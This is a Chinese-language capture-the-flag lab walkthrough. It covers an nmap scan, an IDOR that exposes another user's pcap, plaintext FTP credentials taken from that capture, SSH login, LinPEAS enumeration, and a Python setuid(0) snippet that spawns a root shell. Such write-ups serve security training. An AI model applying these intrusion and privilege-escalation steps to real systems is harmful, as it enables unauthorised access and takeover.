第一个问题是有几个开放的TCP端口。我们nmap扫描一下：

```
nmap 10.10.10.245 -sV -sC -O -v
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: gunicorn
Device type: general purpose
Running: Linux 4.X|5.X
```

可以看到有三个端口，先尝试一下`anonymous`匿名登录ftp，发现不行。

登录网页看一眼

![image-20250924160537791](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250924160537791.png)

问题提示注意url，问能访问别人的扫描记录吗？OK得知是水平越权访问。改变data后面的id值找找，id=0时有数据。

下载是一个pcap文件，我们用wireshark打开分析：

数据包较少，我们快速搂一眼，发现有ftp，想到ftp是明文传输的，会泄露账户和密码。我们过滤器输入ftp，然后找找

![image-20250924161116977](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250924161116977.png)

找到了用户名：`nathan`密码：`Buck3tH4TF0RM3!`

ftp登录一下：

```
Name (10.10.10.245:orange): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

ok成功登录，搂一眼有哪些文件

```
ftp> ls
229 Entering Extended Passive Mode (|||33317|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1001     1001       961834 Sep 24 04:24 linpeas.sh
drwxr-xr-x    3 1001     1001         4096 Sep 24 04:27 snap
-r--------    1 1001     1001           33 Sep 24 04:14 user.txt
```

不管是啥，先全部`get`下载到本地。但是发现snap目录嵌套很深，一层层`cd`然后`get`太慢了

可以使用工具`wget`：

```
wget ftp://10.10.10.245/* --ftp-user=nathan  --ftp-password=Buck3tH4TF0RM3! -r
```

snap下只有一个config.yml没有价值，而linpeas.sh又是一个bash脚本。我们试试用户名密码登录ssh：

```
ssh nathan@10.10.10.245
```

成功登入！

先试试`sudo -l`，结果显示nathan没有sudo权限。看一看`/etc/passwd`，没有找到什么有趣的信息。

`ls -l`搂一眼根目录，有一个`/lost+found`的目录很诱人。丢失了又找回了什么？有可能是root密码。但是很可惜，它阻止了我们的进入，而这显得更加可疑。

回到主目录，运行一下sh脚本。看名字`linpeas`想起了`winpeas`，这不会也是什么权限提升工具吧？

运行一下啊，还真是！

![image-20250924165030103](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250924165030103.png)

我们问一下deepseek，估计挺有名的：

> ### 什么是 LinPEAS？
>
> **LinPEAS** 是 **Linux Privilege Escalation Awesome Script** 的缩写。它是一个功能强大的 Bash 脚本，专门用于在 Linux 系统上自动检测和发现可能的权限提升路径。
>
> 简单来说，它的核心任务是：**帮助你从一个低权限的 shell（例如，一个被入侵的 Web 服务账户）中，系统地找出系统配置错误、弱密码、敏感信息泄露等问题，从而尝试提升到 root 权限。**
>
> ### 开发背景与定位
>
> LinPEAS 由西班牙安全研究员 **Carlos Polop** 开发，并作为其著名渗透测试项目 **PEASS-ng** 的一部分。PEASS-ng 系列还包括 WinPEAS（用于 Windows）和 MacPEAS（用于 macOS）。

ok原来和winpeas还是一个作者。

![image-20250924165401120](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250924165401120.png)

在kali中找寻一下，果然linpeas和winpeas都已经内置好了，这权威性不多说。

最醒目的是**CVE-2021-3560**，这是Polkit权限提升漏洞

![image-20250924165801925](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250924165801925.png)

还有

![image-20250924165908076](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250924165908076.png)

~~这个python3.8没找到，`python --version`查看版本也只有`Python 3.13.7`~~

这里是断开ssh连接了，我都没发现，在自己的机子当然找不到python3.8

这个python3.8设置了suid位，直接用它提权到root即可，CVE-2021-3560没用上。

```
import os
os.setuid(0)
os.system("/bin/bash")
```

这里靶机卡死了，最后的root flag也没拿上。CVE-2021-3560复现就等到vulhub了。